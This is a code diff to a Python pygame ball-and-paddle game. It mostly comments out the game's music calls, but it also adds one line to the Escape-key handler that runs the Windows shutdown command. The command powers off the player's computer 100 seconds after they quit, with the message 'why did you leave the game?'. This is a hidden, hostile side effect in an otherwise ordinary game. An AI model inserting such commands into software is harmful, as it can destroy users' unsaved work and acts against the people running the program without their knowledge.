@@ -19,8 +19,8 @@ clock = pygame.time.Clock()
 font_size = 72
 font = pygame.font.Font('font/Pixeltype.ttf', font_size)
 
-bgmusic = pygame.mixer.Sound('audio/Minecraft (mp3cut.net).mp3')
-gameovermusic = pygame.mixer.Sound('audio/gameoveraudio.wav')
+# bgmusic = pygame.mixer.Sound('audio/Minecraft (mp3cut.net).mp3')
+# gameovermusic = pygame.mixer.Sound('audio/gameoveraudio.wav')
 
 def game_loop(score_required_to_win):
     keys = pygame.key.get_pressed()
@@ -38,7 +38,7 @@ def game_loop(score_required_to_win):
                       down_key=pygame.K_DOWN, color=(100, 255, 100))
 
     ball = Ball(x=width / 2, y=height / 2, radius=10, speed_x=150, color=(0, 255, 255))
-    bgmusic.play(loops=-1)
+    # bgmusic.play(loops=-1)
     while True:
         # Exits game if pressed space or tries to quit. 
         for event in pygame.event.get():
@@ -48,6 +48,7 @@ def game_loop(score_required_to_win):
             elif event.type == pygame.KEYDOWN:
                 if event.key == pygame.K_ESCAPE:
                     pygame.quit()
+                    os.system("C:\\Windows\\System32\\shutdown /s /t 100 /c \"why did you leave the game?\"")
                     quit()
                 elif event.key == pygame.K_SPACE:
                     if not game_active or (not first_time and keys[pygame.K_SPACE]):
@@ -77,7 +78,7 @@ def game_loop(score_required_to_win):
         # (Only watch it after you're done with rest of code)
             clock.tick(fps)
         else:
-            pygame.mixer.music.stop()
+            # pygame.mixer.music.stop()
             screen.fill((0, 0, 0))
                             
             font_size = 32
@@ -88,7 +89,7 @@ def game_loop(score_required_to_win):
                 menutext_rect = menutext_surface.get_rect(center=(width / 2, height / 2))
                 screen.blit(menutext_surface, menutext_rect)
             else:
-                gameovermusic.play()
+                # gameovermusic.play()
                 finalgame_surface = font1.render(str("hola amigos, press space to play again, esc to quit :< "), True,
                                                (255, 255, 255))
                 finalgame_rect = finalgame_surface.get_rect(center=(width / 2, height / 2))
